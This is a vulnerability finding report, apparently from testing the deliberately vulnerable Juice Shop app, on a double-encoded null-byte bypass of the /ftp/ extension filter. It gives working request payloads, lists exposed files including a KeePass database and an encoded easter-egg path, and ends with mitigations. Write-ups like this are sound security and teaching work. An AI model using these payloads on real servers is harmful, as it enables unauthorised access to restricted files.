# File Extension Bypass via Null Byte Injection in FTP Server

## Vulnerability Class
File Extension Bypass / Path Manipulation

## Endpoint
`GET /ftp/{filename}`

## Vulnerable Parameter
File path in URL path (filename component)

## Description
The FTP file server at `/ftp/` enforces an extension filter that only allows `.md` and `.pdf` files. However, this filter can be bypassed by appending a double-encoded null byte (`%2500`) followed by `.md` to the filename. The server processes the null byte as part of the filename, which tricks the extension check while the actual file on disk is served.

## Detection Payload
```
GET /ftp/coupons_2013.md.bak%2500.md HTTP/1.1
Host: juiceshop.local:3000
```

## Evidence
- Direct request to `/ftp/coupons_2013.md.bak` returns **403 Forbidden** with error "Only .md and .pdf files are allowed!"
- Request to `/ftp/coupons_2013.md.bak%2500.md` returns **200 OK** with 131 bytes of file content
- Same bypass works for all blocked file types:
  - `/ftp/encrypt.pyc%2500.md` → 200, 573 bytes (Python bytecode, contains module names: encrypt.py, announcement.mdt)
  - `/ftp/eastere.gg%2500.md` → 200, 324 bytes (contains base64-encoded path: `L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==`)
  - `/ftp/incident-support.kdbx%2500.md` → 200, 3246 bytes (KeePass database)

## Impact
An attacker can access any file within the FTP directory regardless of its extension, bypassing the intended access control. This exposes backup files (.bak), compiled Python modules (.pyc), and other sensitive file types that were intentionally restricted.

## Mitigation
- Use a whitelist-based approach that validates the actual file extension on the server side (not just URL path)
- Null-byte injection should be sanitized before path processing
- Apply the extension filter after URL decoding, not before